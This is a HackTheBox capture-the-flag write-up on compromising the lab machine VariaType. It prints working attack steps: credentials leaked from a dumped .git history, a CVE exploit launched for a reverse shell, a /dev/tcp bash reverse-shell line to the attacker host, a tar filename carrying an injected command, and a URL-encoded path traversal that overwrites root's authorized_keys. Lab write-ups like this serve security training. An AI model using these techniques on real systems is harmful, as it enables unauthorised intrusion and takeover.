# HackTheBox: VariaType Write-up

## Enumeration

An initial Nmap scan against the target IP reveals that ports 22 (SSH) and 80 (HTTP) are open.

```bash
nmap -sSVC -A 10.129.50.170
...
22/tcp open ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open http    nginx 1.22.1
```

Fuzzing for subdomains using `ffuf` reveals a hidden subdomain named `portal`.

```bash
ffuf -u http://variatype.htb -H "Host: FUZZ.variatype.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac
...
portal                  [Status: 200, Size: 2494, Words: 445, Lines: 59, Duration: 1843ms]
```

Further enumeration on the `portal` subdomain reveals an exposed `.git` directory. We can dump the repository and examine the commit history. 

```bash
git show 753b5f5
commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date: Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

diff --git a/auth.php b/auth.php
index 615e621..b328305 100644
--- a/auth.php
+++ b/auth.php
@@ -1,3 +1,5 @@
 <?php
 session_start();
-$USERS = [];
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];
```
We extract the credentials for the `gitbot` user.

## Initial Foothold

Using the obtained credentials, we can exploit `varlib-cve-2025-66034` to achieve Remote Code Execution and get a reverse shell.

```bash
python3 varlib_cve_2025_66034.py --ip 10.10.14.214 --port 4444 --path /var/www/portal.variatype.htb/public/files-trigger http://portal.variatype.htb/files --url http://variatype.htb/tools/variable-font-generator/process
```

Once the exploit is triggered, we receive a shell as `www-data`.

## Lateral Movement: User Steve

Monitoring processes with `pspy64` reveals an automated task running as the user `steve`. This process automatically extracts files dropped into the `/var/www/portal.variatype.htb/public/files/` directory.

We can exploit this by creating a malicious `tar` archive containing a file with a Bash command injected into its filename. When Steve's script extracts the archive, the payload will execute.

1. **Create the payload script (`shell.sh`):**
   ```bash
   echo 'bash -i >& /dev/tcp/10.10.14.214/6666 0>&1' > /tmp/shell.sh
   ```

2. **Generate the malicious tar archive (Python):**
   ```python
   import tarfile, io
   name = "exploit.ttf; bash /tmp/shell.sh;"
   with tarfile.open("exploit.tar", "w") as tar:
       info = tarfile.TarInfo(name=name)
       info.size = 1
       tar.addfile(info, io.BytesIO(b"a"))
   ```

3. **Trigger the exploit:**
   Copy `exploit.tar` into the target directory. Start a netcat listener on port `6666` to catch the shell as `steve`.

   ```bash
   nc -lvnp 6666
   # Connection received from 10.129.53.122
   steve@variatype:/tmp/ffarchive-4873-1$ cd ~
   steve@variatype:~$ cat user.txt
   # User flag obtained.
   ```

## Privilege Escalation: Root

Checking sudo privileges, we find that `steve` can run a specific Python script as root without a password:

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py *
```

This script takes a URL as an argument, downloads a file, and saves it. The vulnerability lies in the fact that the destination path can be manipulated using URL encoding.

1. **Prepare the payload:**
   Generate an SSH keypair locally and start a Python HTTP server hosting the public key (`id_rsa.pub`).

2. **Exploit the script:**
   Execute the script, passing the URL to our public key, but append the URL-encoded path to root's `authorized_keys` file. This forces the script to overwrite it.

   ```bash
   sudo /usr/bin/python3 /opt/font-tools/install_validator.py "http://10.10.14.214:8000/%2froot%2f.ssh%2fauthorized_keys"
   ```

3. **Get Root:**
   With the key successfully written, we can SSH directly into the machine as `root`.

   ```bash
   chmod 600 id_rsa
   ssh -i id_rsa root@10.129.53.122
   root@variatype:~# cat /root/root.txt
   # Root flag obtained.
   ```
